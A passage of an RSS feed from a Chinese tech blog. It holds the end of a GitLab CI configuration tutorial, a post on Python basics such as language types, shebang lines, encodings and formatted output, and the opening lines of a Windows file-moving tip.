  - &lt;span style=&#34;color:#ae81ff&#34;&gt;test&lt;/span&gt;
 
&lt;span style=&#34;color:#75715e&#34;&gt;# 定义 job（任务）&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;job1&lt;/span&gt;:
  &lt;span style=&#34;color:#f92672&#34;&gt;stage&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;test&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;tags&lt;/span&gt;:
    - &lt;span style=&#34;color:#ae81ff&#34;&gt;XX &lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 只有标签为XX的runner才会执行这个任务&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;only&lt;/span&gt;:
    - &lt;span style=&#34;color:#ae81ff&#34;&gt;dev&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 只有dev分支提交代码才会执行这个任务。也可以是分支名称或触发器名称&lt;/span&gt;
    - &lt;span style=&#34;color:#ae81ff&#34;&gt;/^future-.*$/&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 正则表达式，只有future-开头的分支才会执行&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;:
    - &lt;span style=&#34;color:#ae81ff&#34;&gt;echo &amp;#34;I am job1&amp;#34;&lt;/span&gt;
    - &lt;span style=&#34;color:#ae81ff&#34;&gt;echo &amp;#34;I am in test stage&amp;#34;&lt;/span&gt;
    
&lt;span style=&#34;color:#f92672&#34;&gt;job2&lt;/span&gt;:
  &lt;span style=&#34;color:#f92672&#34;&gt;stage&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;test&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 如果此处没有定义stage，其默认也是test&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;only&lt;/span&gt;:
    - &lt;span style=&#34;color:#ae81ff&#34;&gt;master&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 只有master分支提交代码才会执行这个任务&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;:
    - &lt;span style=&#34;color:#ae81ff&#34;&gt;echo &amp;#34;I am job2&amp;#34;&lt;/span&gt;
    - &lt;span style=&#34;color:#ae81ff&#34;&gt;echo &amp;#34;I am in test stage&amp;#34;&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;allow_failure&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 允许失败，即不影响下步构建&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;.job3&lt;/span&gt;:
&lt;span style=&#34;color:#75715e&#34;&gt;# 对于临时不想执行的job，可以选择在前面加个&amp;#34;.&amp;#34;，这样就会跳过此步任务，否则你除了要注释掉这个job3外，还需要注释上面为build的stage&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;stage&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;build&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;except&lt;/span&gt;:
    - &lt;span style=&#34;color:#ae81ff&#34;&gt;dev&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 除了dev分支，其它分支提交代码都会执行这个任务&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;:
    - &lt;span style=&#34;color:#ae81ff&#34;&gt;echo &amp;#34;I am job3&amp;#34;&lt;/span&gt;
    - &lt;span style=&#34;color:#ae81ff&#34;&gt;echo &amp;#34;I am in build stage&amp;#34;&lt;/span&gt;
    
&lt;span style=&#34;color:#75715e&#34;&gt;# 下面几个都相当于全局变量&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;before_script&lt;/span&gt;:
  - &lt;span style=&#34;color:#ae81ff&#34;&gt;echo &amp;#34;每个job之前都会执行&amp;#34;&lt;/span&gt;
  - &lt;span style=&#34;color:#ae81ff&#34;&gt;export MVN_HOME&lt;/span&gt;
  - &lt;span style=&#34;color:#ae81ff&#34;&gt;export JAVA_HOME&lt;/span&gt;
  - &lt;span style=&#34;color:#ae81ff&#34;&gt;java -version&lt;/span&gt;
  - &lt;span style=&#34;color:#ae81ff&#34;&gt;sh /home/gitlab-runner/kill.sh&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;after_script&lt;/span&gt;:
  - &lt;span style=&#34;color:#ae81ff&#34;&gt;echo &amp;#34;每个job之后都会执行&amp;#34;&lt;/span&gt;
  
&lt;span style=&#34;color:#f92672&#34;&gt;variables&lt;/span&gt;: 
&lt;span style=&#34;color:#75715e&#34;&gt;# 变量&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;DATABASE_URL&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;postgres://postgres@postgres/my_database&amp;#34;&lt;/span&gt; 
  &lt;span style=&#34;color:#75715e&#34;&gt;# 在job中可以用${DATABASE_URL}来使用这个变量。常用的预定义变量有CI_COMMIT_REF_NAME（项目所在的分支或标签名称），CI_JOB_NAME（任务名称），CI_JOB_STAGE（任务阶段）&lt;/span&gt;

  &lt;span style=&#34;color:#f92672&#34;&gt;GIT_STRATEGY&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;none&amp;#34;&lt;/span&gt; 
  &lt;span style=&#34;color:#75715e&#34;&gt;# GIT策略，定义拉取代码的方式，有3种：clone/fetch/none，默认为clone，速度最慢，每步job都会重新clone一次代码。我们一般将它设置为none，在具体任务里设置为fetch就可以满足需求，毕竟不是每步都需要新代码，那也不符合我们测试的流程&lt;/span&gt;
  
&lt;span style=&#34;color:#f92672&#34;&gt;cache&lt;/span&gt;: 
&lt;span style=&#34;color:#75715e&#34;&gt;# 缓存&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#因为缓存为不同管道和任务间共享，可能会覆盖，所以有时需要设置key&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;key&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;${CI_COMMIT_REF_NAME} &lt;/span&gt;
  &lt;span style=&#34;color:#75715e&#34;&gt;# 启用每分支缓存。&lt;/span&gt;
  &lt;span style=&#34;color:#75715e&#34;&gt;# key: &amp;#34;$CI_JOB_NAME/$CI_COMMIT_REF_NAME&amp;#34; # 启用每个任务和每个分支缓存。需要注意的是，如果是在windows中运行这个脚本，需要把$换成%&lt;/span&gt;

  &lt;span style=&#34;color:#f92672&#34;&gt;untracked&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt; 
  &lt;span style=&#34;color:#75715e&#34;&gt;# 缓存所有Git未跟踪的文件&lt;/span&gt;

  &lt;span style=&#34;color:#f92672&#34;&gt;paths&lt;/span&gt;: 
  &lt;span style=&#34;color:#75715e&#34;&gt;# 以下2个文件夹会被缓存起来，下次构建会解压出来&lt;/span&gt;
    - &lt;span style=&#34;color:#ae81ff&#34;&gt;node_modules/&lt;/span&gt;
    - &lt;span style=&#34;color:#ae81ff&#34;&gt;dist/&lt;/span&gt;
    
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;9保留字段&#34;&gt;9.保留字段&lt;/h2&gt;
&lt;p&gt;这些保留字段不能被定义为 job 名称&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;image和services&lt;/strong&gt;：这两个关键字允许使用一个自定义的Docker镜像和一系列的服务，并且可以用于整个job周期&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;before_script&lt;/strong&gt;：before_script 用来定义所有job之前运行的命令&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;after_script&lt;/strong&gt;：after_script用来定义所有job之后运行的命令&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;stages&lt;/strong&gt;：stages用来定义可以被job调用的stages。stages的规范允许有灵活的多级pipelines。stages中的元素顺序决定了对应job的执行顺序&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 相同stage的job可以平行执行。&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 下一个stage的job会在前一个stage的job成功后开始执行。&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 如果.gitlab-ci.yml中没有定义stages，那么job&amp;#39;s stages 会默认定义为 build，test 和 deploy。&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 如果一个job没有指定stage，那么这个任务会分配到test stage。&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;types&lt;/strong&gt;：与stages同义&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;variables&lt;/strong&gt;：变量&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;variables&lt;/span&gt;:
  &lt;span style=&#34;color:#ae81ff&#34;&gt;DATABASE_URL:&amp;#34;postgres://postgres@postgres/my_database&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;cache&lt;/strong&gt;：用来指定需要在job之间缓存的文件或目录。只能使用该项目工作空间内的路径。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Jobs&lt;/strong&gt;：工作&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;script&lt;/strong&gt;：脚本&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;10only-and-except&#34;&gt;10.only and except&lt;/h2&gt;
&lt;p&gt;only 和 except 是两个参数用分支策略来限制jobs构建：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;only 定义哪些分支和标签的 git 项目将会被 job 执行。&lt;/li&gt;
&lt;li&gt;except 定义哪些分支和标签的 git 项目将不会被 job 执行。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;下面是 refs 策略的使用规则：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;only 和 except 可同时使用。如果 only 和 except 在一个 job 配置中同时存在，则以 only 为准，跳过 except。&lt;/li&gt;
&lt;li&gt;only 和 except 可以使用正则表达式。&lt;/li&gt;
&lt;li&gt;only 和 except 允许使用特殊的关键字：branches，tags和triggers。&lt;/li&gt;
&lt;li&gt;only 和 except 允许使用指定仓库地址但不是 forks 的仓库。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;11tags&#34;&gt;11.tags&lt;/h2&gt;
&lt;p&gt;tags 可以从允许运行此项目的所有 Runners 中选择特定的 Runners 来执行 jobs。&lt;/p&gt;
&lt;p&gt;在注册 Runner 的过程中，我们可以设置 Runner 的标签，比如 ruby，postgres，development。&lt;/p&gt;
&lt;p&gt;tags 可通过 tags 来指定特殊的 Runners 来运行 jobs。&lt;/p&gt;
&lt;h2 id=&#34;12allow_failure&#34;&gt;12.allow_failure&lt;/h2&gt;
&lt;p&gt;allow_failure 可以用于当你想设置一个 job 失败的之后并不影响后续的 CI 组件的时候。失败的 jobs 不会影响到 commit 状态。&lt;/p&gt;
&lt;p&gt;当开启了允许 job 失败，所有的 intents 和 purposes 里的 pipeline 都是成功/绿色，但是也会有一个&amp;quot;CI build passed with warnings&amp;quot;信息显示在 merge request 或 commit 或 job page。这被允许失败的作业使用，但是如果失败表示其他地方应采取其他（手动）步骤。&lt;/p&gt;
&lt;h2 id=&#34;13when&#34;&gt;13.when&lt;/h2&gt;
&lt;p&gt;when is used to implement jobs that are run in case of failure or despite the failure.&lt;/p&gt;
&lt;p&gt;when 可以设置以下值：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;on_success - 只有前面 stages 的所有工作成功时才执行。 这是默认值。&lt;/li&gt;
&lt;li&gt;on_failure - 当前面 stages 中任意一个 jobs 失败后执行。&lt;/li&gt;
&lt;li&gt;always - 无论前面 stages 中 jobs 状态如何都执行。&lt;/li&gt;
&lt;li&gt;manual- 手动执行(GitLab8.10增加)。更多请查看手动操作。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;14manual-actions&#34;&gt;14.Manual actions&lt;/h2&gt;
&lt;p&gt;手动操作指令是不自动执行的特殊类型的 job；它们必须要人为启动。手动操作指令可以从 pipeline，build，environment 和 deployment 视图中启动。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Python—一般知识</title>
        <link>https://ac-lm.github.io/posts/python/python%E4%B8%80%E8%88%AC%E7%9F%A5%E8%AF%86/</link>
        <pubDate>Wed, 13 Jan 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/python%E4%B8%80%E8%88%AC%E7%9F%A5%E8%AF%86/</guid>
        <description>&lt;h2 id=&#34;1语言的分类&#34;&gt;1.语言的分类&lt;/h2&gt;
&lt;h3 id=&#34;编译型语言和解释性语言&#34;&gt;①编译型语言和解释性语言&lt;/h3&gt;
&lt;p&gt;编译型语言是指在程序执行之前，有一个单独的编译过程，将程序翻译成机器语言，以后执行这个程序的时候，就不用再进行翻译了。解释型语言是指是在运行的时候将程序翻译成机器语言，所以运行速度相对于编译型语言要慢。C/C++ 等都是编译型语言，而Java，C#等都是解释型语言。虽然Java程序在运行之前也有一个编译过程，但是并不是将程序编译成机器语言，而是将它编译成字节码（可以理解为一个中间语言）。在运行的时候，由JVM将字节码再翻译成机器语言。&lt;/p&gt;
&lt;h3 id=&#34;动态语言和静态语言&#34;&gt;②动态语言和静态语言&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;动态类型语言：动态类型语言是指在运行期间才去做数据类型检查的语言，也就是说，在用动态类型的语言编程时，永远也不用给任何变量指定数据类型。如python和ruby等。&lt;/li&gt;
&lt;li&gt;静态类型语言：它的数据类型是在编译其间检查的，也就是说在写程序时要声明所有变量的数据类型。如C/C++,java,C#等。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;强类型定义语言和弱类型定义语言&#34;&gt;③强类型定义语言和弱类型定义语言&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;强类型定义语言：强制数据类型定义的语言。也就是说，一旦一个变量被指定了某个数据类型，如果不经过强制转换，那么它就永远是这个数据类型了,如python。&lt;/li&gt;
&lt;li&gt;弱类型定义语言：数据类型可以被忽略的语言。它与强类型定义语言相反, 一个变量可以赋不同数据类型的值。如VScript。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2python的优点&#34;&gt;2.python的优点&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;①Python的定位是“优雅”、“明确”、“简单”，所以Python程序看上去总是简单易懂，初学者学Python，不但入门容易，而且将来深入下去，可以编写那些非常非常复杂的程序。&lt;/li&gt;
&lt;li&gt;②开发效率非常高，Python有非常强大的第三方库，基本上你想通过计算机实现任何功能，Python官方库里都有相应的模块进行支持，直接下载调用后，在基础库的基础上再进行开发，大大降低开发周期，避免重复造轮子。&lt;/li&gt;
&lt;li&gt;③高级语言————当你用Python语言编写程序的时候，你无需考虑诸如如何管理你的程序使用的内存一类的底层细节&lt;/li&gt;
&lt;li&gt;④可移植性————由于它的开源本质，Python已经被移植在许多平台上（经过改动使它能够工 作在不同平台上）。如果你小心地避免使用依赖于系统的特性，那么你的所有Python程序无需修改就几乎可以在市场上所有的系统平台上运行&lt;/li&gt;
&lt;li&gt;⑤可扩展性————如果你需要你的一段关键代码运行得更快或者希望某些算法不公开，你可以把你的部分程序用C或C++编写，然后在你的Python程序中使用它们&lt;/li&gt;
&lt;li&gt;⑥可嵌入性————你可以把Python嵌入你的C/C++程序，从而向你的程序用户提供脚本功能。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3python的缺点&#34;&gt;3.python的缺点&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;①速度慢，Python 的运行速度相比C语言确实慢很多，跟JAVA相比也要慢一些，因此这也是很多所谓的大牛不屑于使用Python的主要原因，但其实这里所指的运行速度慢在大多数情况下用户是无法直接感知到的，必须借助测试工具才能体现出来，其实在大多数情况下Python已经完全可以满足你对程序速度的要求，除非你要写对速度要求极高的搜索引擎等，这种情况下，当然还是建议你用C去实现的。&lt;/li&gt;
&lt;li&gt;②代码不能加密，因为PYTHON是解释性语言，它的源码都是以名文形式存放的，不过我不认为这算是一个缺点，如果你的项目要求源代码必须是加密的，那你一开始就不应该用Python来去实现。&lt;/li&gt;
&lt;li&gt;③线程不能利用多CPU问题，这是Python被人诟病最多的一个缺点，GIL即全局解释器锁（Global Interpreter Lock），是计算机程序设计语言解释器用于同步线程的工具，使得任何时刻仅有一个线程在执行，Python的线程是操作系统的原生线程。在Linux上为pthread，在Windows上为Win thread，完全由操作系统调度线程的执行。一个python解释器进程内有一条主线程，以及多条用户程序的执行线程。即使在多核CPU平台上，由于GIL的存在，所以禁止多线程的并行执行。关于这个问题的折衷解决方法，我们在以后线程和进程章节里再进行详细探讨。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;4在编写python程序时usrbinpython和usrbinenv-python的区别&#34;&gt;4.在编写Python程序时，/usr/bin/python和/usr/bin/env python的区别？&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;#!/usr/bin/python是告诉操作系统执行这个脚本的时候，调用/usr/bin下的python解释器&lt;/li&gt;
&lt;li&gt;#!/usr/bin/env python这种用法是为了防止操作系统用户没有将python装在默认的/usr/bin路径里。当系统看到这一行的时候，首先会到env设置里查找python的安装路径，再调用对应路径下的解释器程序完成操作。&lt;/li&gt;
&lt;li&gt;#!/usr/bin/python相当于写死了python路径&lt;/li&gt;
&lt;li&gt;#!/usr/bin/env python会去环境设置寻找python目录,推荐这种写法&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;5变量&#34;&gt;5.变量&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;①变量名只能是字母、数字或下划线的任意组合&lt;/li&gt;
&lt;li&gt;②变量名的第一个字符不能是数字&lt;/li&gt;
&lt;li&gt;③以下关键字不能声明为变量名
[&amp;lsquo;and&amp;rsquo;, &amp;lsquo;as&amp;rsquo;, &amp;lsquo;assert&amp;rsquo;, &amp;lsquo;break&amp;rsquo;, &amp;lsquo;class&amp;rsquo;, &amp;lsquo;continue&amp;rsquo;, &amp;lsquo;def&amp;rsquo;, &amp;lsquo;del&amp;rsquo;, &amp;lsquo;elif&amp;rsquo;, &amp;lsquo;else&amp;rsquo;, &amp;lsquo;except&amp;rsquo;, &amp;lsquo;exec&amp;rsquo;, &amp;lsquo;finally&amp;rsquo;, &amp;lsquo;for&amp;rsquo;, &amp;lsquo;from&amp;rsquo;, &amp;lsquo;global&amp;rsquo;, &amp;lsquo;if&amp;rsquo;, &amp;lsquo;import&amp;rsquo;, &amp;lsquo;in&amp;rsquo;, &amp;lsquo;is&amp;rsquo;, &amp;lsquo;lambda&amp;rsquo;, &amp;lsquo;not&amp;rsquo;, &amp;lsquo;or&amp;rsquo;, &amp;lsquo;pass&amp;rsquo;, &amp;lsquo;print&amp;rsquo;, &amp;lsquo;raise&amp;rsquo;, &amp;lsquo;return&amp;rsquo;, &amp;lsquo;try&amp;rsquo;, &amp;lsquo;while&amp;rsquo;, &amp;lsquo;with&amp;rsquo;, &amp;lsquo;yield&amp;rsquo;]&lt;/li&gt;
&lt;li&gt;④变量名要见名之义。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;6常量&#34;&gt;6.常量&lt;/h2&gt;
&lt;p&gt;不能改变的量，变量名要大写。（可以修改，但是不应该改）。&lt;/p&gt;
&lt;h2 id=&#34;7字符编码&#34;&gt;7.字符编码&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;①ASCII（American Standard Code for Information Interchange，美国标准信息交换代码）是基于拉丁字母的一套电脑编码系统，最多只能有八位字节来表示，ASCII码最多只能表示 255 个符号。，占八位，一个字节。&lt;/li&gt;
&lt;li&gt;②unicode（统一码、万国码、单一码）是一种在计算机上使用的字符编码。Unicode 是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，规定虽有的字符和符号最少由 16 位来表示（2个字节），即：2X16 = 65536，备注：是至少需要2个字节。&lt;/li&gt;
&lt;li&gt;③UTF-8，是对Unicode编码的压缩和优化，他不再使用最少使用2个字节，而是将所有的字符和符号进行分类：ascii码中的内容用1个字节保存、欧洲的字符用2个字节保存，东亚的字符用3个字节保存。Python3默认的字符编码就是utf-8&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;8标准化输出&#34;&gt;8.标准化输出：&lt;/h2&gt;
&lt;h3 id=&#34;第一种标准输出&#34;&gt;①第一种标准输出：&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ASDDF&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;第二种标准输出使用占位符&#34;&gt;②第二种标准输出（使用占位符）&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# _*_ coding:utf8 _*_&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#author：snate&lt;/span&gt;
name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;name：&amp;#34;&lt;/span&gt;)
age&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;int (input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;age：&amp;#34;&lt;/span&gt;))
Job&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Job:&amp;#34;&lt;/span&gt;)
salary&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;float (input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;salary:&amp;#34;&lt;/span&gt;))
info&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    -----------info of &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;-----------
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    name:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    age:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    Job:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    salary:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    -------------------------------
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;(name,name,age,Job,salary)
print(info)
&lt;span style=&#34;color:#75715e&#34;&gt;# 其中%s是占位符，&amp;#34;&amp;#34;&amp;#34; 标准输出内容&amp;#34;&amp;#34;&amp;#34;，此处单引号双引号都可以。&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# input默认输入的是字符串，要转化成数字类型需要强转。&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;第三种标准输出&#34;&gt;③第三种标准输出&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# _*_ coding:utf8 _*_&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#author GXW&lt;/span&gt;
name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;name：&amp;#34;&lt;/span&gt;)
age&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;int(input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;age：&amp;#34;&lt;/span&gt;))
job&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Job:&amp;#34;&lt;/span&gt;)
salary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; float(input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;salary:&amp;#34;&lt;/span&gt;))
info2&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    =================info of &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{_name}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;====================
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    name:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{_name}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    age:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{_age}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    job:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{_job}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    salary:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{_salary}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    ===================================================
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(_name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;name,
               _age&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;age,
               _job&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;job,
               _salary&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;salary)
print(info2)
&lt;span style=&#34;color:#75715e&#34;&gt;# 使用format进行标准输出，利用key的形式。.format(_name=name,_age=age,_job=job,_salary=salary)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Windows—利用搜索实现批量文件移动</title>
        <link>https://ac-lm.github.io/posts/windows10/windows%E5%88%A9%E7%94%A8%E6%90%9C%E7%B4%A2%E5%AE%9E%E7%8E%B0%E6%89%B9%E9%87%8F%E6%96%87%E4%BB%B6%E7%A7%BB%E5%8A%A8/</link>
        <pubDate>Wed, 13 Jan 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/windows10/windows%E5%88%A9%E7%94%A8%E6%90%9C%E7%B4%A2%E5%AE%9E%E7%8E%B0%E6%89%B9%E9%87%8F%E6%96%87%E4%BB%B6%E7%A7%BB%E5%8A%A8/</guid>
        <description>&lt;h2 id=&#34;1实现&#34;&gt;1.实现&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;找到目标文件夹&lt;/li&gt;
